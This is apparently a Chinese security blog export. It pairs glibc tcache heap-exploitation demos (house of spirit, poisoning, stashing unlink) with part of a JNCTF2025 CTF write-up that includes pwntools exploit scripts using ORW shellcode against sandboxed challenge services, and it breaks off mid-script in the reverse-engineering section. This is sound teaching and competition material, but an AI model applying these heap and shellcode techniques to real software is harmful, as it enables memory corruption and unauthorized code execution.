class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>];<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake_chunks[1] 在 %p\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake_chunks[1] 改成 0x40 \n&quot;</span>);<br>    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;把 fake_chunks[2] 的地址赋给 a, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉 a\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再去 malloc(0x30)，在可以看到申请来的结果在: %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ojbk\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>相比与2.23版本下的house_of_spirit，在2.27版本下用tcache会更简单，直接去free fake_chunk再申请回来就可以（仅仅需要伪造一个size位）</p><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-type">size_t</span> stack_var;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;定义了一个变量 stack_var，我们想让程序 malloc 到这里 %p.\n&quot;</span>, (<span class="hljs-type">char</span> *)&amp;stack_var);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接下来申请两个 chunk\n&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk a 在: %p\n&quot;</span>, a);<br>    <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk b 在: %p\n&quot;</span>, b);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free 掉这两个 chunk\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在 tcache 那个链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;我们把 %p 的前 %lu 字节（也就是 fd/next 指针）改成 stack_var 的地址：%p&quot;</span>, b, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>), &amp;stack_var);<br>    b[<span class="hljs-number">0</span>] = (<span class="hljs-type">intptr_t</span>)&amp;stack_var;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在 tcache 链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;然后一次 malloc : %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在 tcache 链表是这样的 [ %p ].\n&quot;</span>, &amp;stack_var);<br><br>    <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第二次 malloc: %p\n&quot;</span>, c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ojbk\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先申请两个chunk然后释放，把第二个chunk的fd修改为要malloc到的地址，然后malloc两次就好了</p><h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *chunk_lis[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *target;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *pp;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var 是我们希望分配到的地址，我们首先把 &amp;stack_var[2] 写到 stack_var[3] 来绕过 glibc 的 bck-&gt;fd=bin（即 fake chunk-&gt;bk 应该是一个可写的地址）\n&quot;</span>);<br>    stack_var[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;修改之后 fake_chunk-&gt;bk 是:%p\n&quot;</span>,(<span class="hljs-type">void</span>*)stack_var[<span class="hljs-number">3</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var[4] 的初始值是:%p\n&quot;</span>,(<span class="hljs-type">void</span>*)stack_var[<span class="hljs-number">4</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在申请 9 个 0x90 的 chunk\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        chunk_lis[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    &#125;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先释放 6 个，这 6 个都会放到 tcache 里面\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        <span class="hljs-built_in">free</span>(chunk_lis[i]);<br>    &#125;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来的释放的三个里面第一个是最后一个放到 tcache 里面的，后面的都会放到 unsortedbin 中\n&quot;</span>);<br>    <br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//接下来的就是放到 unsortedbin 了</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来申请一个大于 0x90 的 chunk，chunk0 和 chunk2 都会被整理到 smallbin 中\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<span class="hljs-comment">//&gt;0x90</span><br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;然后再去从 tcache 中申请两个 0x90 大小的 chunk\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;假设有个漏洞，可以把 victim-&gt;bk 的指针改写成 fake_chunk 的地址: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)stack_var);<br>    chunk_lis[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)stack_var;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 calloc 申请一个 0x90 大小的 chunk，他会把一个 smallbin 里的 chunk0 返回给我们，另一个 smallbin 的 chunk2 将会与 tcache 相连.\n&quot;</span>);<br>    pp = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候我们的 fake_chunk 已经放到了 tcache bin[0xa0] 这个链表中，它的 fd 指针现在指向下一个空闲的块: %p， bck-&gt;fd 已经变成了 libc 的地址: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)stack_var[<span class="hljs-number">2</span>],(<span class="hljs-type">void</span>*)stack_var[<span class="hljs-number">4</span>]);<br>    target = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);  <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再次 malloc 0x90 可以看到申请到了 fake_chunk: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)target); <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ojbk\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先让fake_chunk的fd指向bk绕过检测，然后申请9个chunk，free6个填满tcache_bins，然后依次释放p1，p0，p2。这里0和2会进入unsorted_bins</p><blockquote><p>tcache_bins：p8-&gt;p7-&gt;p6-&gt;p5-&gt;p4-&gt;p3</p></blockquote><p>接着申请一个大于0x90的chunk把p0和p2整理到small_bins，然后从tcache申请2个0x90的chunk</p><blockquote><p>tcache_bins：p6-&gt;p5-&gt;p4-&gt;p3</p></blockquote><blockquote><p>small_bins：2-&gt;0</p></blockquote><p>然后把p2的bk改为fake_chunk的地址，然后去calloc p0，此时p2就连到了tcache上</p><blockquote><p>tcache_bins：fake_chunk-&gt;p2-&gt;p6-&gt;p5-&gt;p4-&gt;p3</p></blockquote><p>此时fake_chunk的下一个空闲块为fake_chunk的fd，fake_chunk[4]变为libc地址</p><p>再申请一次就申请到了fake_chunk</p>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNCTF2025WP</title>
    <link href="/2025/03/24/JNCTF2025WP/"/>
    <url>/2025/03/24/JNCTF2025WP/</url>
    
    <content type="html"><![CDATA[<h1 id="JNCTF2025-WP"><a href="#JNCTF2025-WP" class="headerlink" title="JNCTF2025 WP"></a>JNCTF2025 WP</h1><p>  <em>————Sally</em></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="1-signin"><a href="#1-signin" class="headerlink" title="1. signin"></a>1. signin</h3><p>unregister的权限问题，可以用Admin账户去注销root账户，然后重新注册root账户就能拿到管理员权限</p><p><img src="/../images/1/image-20250323191804461.png" alt="image-20250323191804461"></p><p><img src="/../images/1/image-20250323191840975.png" alt="image-20250323191840975"></p><h3 id="2-shellcoe-master（非预期解法）"><a href="#2-shellcoe-master（非预期解法）" class="headerlink" title="2. shellcoe_master（非预期解法）"></a>2. shellcoe_master（非预期解法）</h3><p>这个题给了个沙箱，限制只能用orw，而且write一次只能输出一个字节，还开了PIE保护</p><p><img src="/../images/1/image-20250323192427502.png" alt="image-20250323192427502"></p><p>在执行shellcode之前，除r15和rip之外的寄存器全部清0（指向buf的位置）。而且在执行shellcode的时候buf段不可写，也代表着push和pop之类的指令不能用了。</p><p>然后想到bss段rw权限，直接把flag写在bss段，然后orw，一个个字节读出来就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># r=process(&#x27;./sc_master_patched&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;172.18.137.75&#x27;</span>,<span class="hljs-number">32403</span>)<br><span class="hljs-comment"># bss=0x4078</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *$rebase(0x161B)&#x27;)</span><br><br><span class="hljs-comment">#shellcode</span><br><span class="hljs-comment"># 0. read(0,bss+base,0x30)</span><br><span class="hljs-comment"># 1. open(&#x27;./flag&#x27;)</span><br><span class="hljs-comment"># 2. read(0, buf+base+0x100, 0x30)</span><br><span class="hljs-comment"># 3. write(1, buf+base+0x100, 1)</span><br><span class="hljs-comment"># 4. write(1, buf+base+0x101,1)</span><br><span class="hljs-comment"># ......</span><br><br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">add r15,0x4078</span><br><span class="hljs-string">mov rsp,r15</span><br><span class="hljs-string">mov rdx,0x50</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload0=<span class="hljs-string">b&#x27;flag\x00&#x27;</span><br>shellcode2=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov r8,rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rdi,r8</span><br><span class="hljs-string">add r15,0x100</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,0x50</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add rsp,0x100</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,41</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=shellcode1<br>payload+=shellcode2<br><br>r.sendline(payload)<br>r.sendline(payload0)<br>r.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="3-shellcode-master-revenge"><a href="#3-shellcode-master-revenge" class="headerlink" title="3. shellcode_master_revenge"></a>3. shellcode_master_revenge</h3><p><img src="/../images/1/image-20250323193200743.png" alt="image-20250323193200743"></p><p>把地址换成了固定的0x114514000，不能把flag写在bss段了（</p><p>思路还是一样的，不过这次要利用read读数据到不可写地址时返回负数的原理来爆破找一个可写的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># r=process(&#x27;./sc_master_revenge&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;172.18.137.75&#x27;</span>,<span class="hljs-number">32233</span>)<br><span class="hljs-comment"># bss=0x4078</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *$rebase(0x1656)&#x27;)</span><br><br>shellcode0=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">movabs r14,0x7fffffff0000</span><br><span class="hljs-string">loop_start:</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rsi, r14</span><br><span class="hljs-string">    mov rdx, 5</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    test rax, rax</span><br><span class="hljs-string">    jns continue_exec</span><br><span class="hljs-string">    sub r14, 0x10000</span><br><span class="hljs-string">    jmp loop_start</span><br><span class="hljs-string">continue_exec:</span><br><span class="hljs-string">    mov r15, rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1 </span><br><span class="hljs-string">    movabs r11, 0x114514001</span><br><span class="hljs-string">    mov rsi, r11</span><br><span class="hljs-string">    mov rdx, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    mov rdi,0</span><br><span class="hljs-string">    mov rdx,0x50</span><br><span class="hljs-string">    mov rsi,r14</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>shellcode2=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">mov rdi,r14</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov r8,rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rdi,r8</span><br><span class="hljs-string">mov rsi,r14</span><br><span class="hljs-string">mov rdx,0x50</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov r9,rax</span><br><span class="hljs-string">xor r10,r10</span><br><span class="hljs-string"></span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    cmp r10, r9</span><br><span class="hljs-string">    jge exit_program </span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov rax,1</span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    lea rsi,[r14+r10]</span><br><span class="hljs-string">    mov rdx,1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    add r10,1</span><br><span class="hljs-string">    jmp loop      </span><br><span class="hljs-string">exit_program:</span><br><span class="hljs-string">    mov rax,60</span><br><span class="hljs-string">    xor rdi,rdi</span><br><span class="hljs-string">    syscall     </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=shellcode0<br>payload+=shellcode1<br>payload+=shellcode2<br>payload0 = <span class="hljs-string">b&#x27;flag\x00&#x27;</span><br><br>r.sendline(payload)<br>r.send(payload0)<br>r.sendline(payload0)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>在原来的exp上又稍微改进了一下，在0x7fffffff000的地址开始爆破</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="compose"><a href="#compose" class="headerlink" title="compose"></a>compose</h3><p>在class3.dex里面找到Main activity和Main activity.kt，可以看出是一个RC4加密，密钥是Tanggegehaoshuai，直接写脚本就爆出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">b&#x27;TanggegeHaoShuai&#x27;</span><br>enc = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x12</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x61</span>,<br>    <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x30</span>, <span 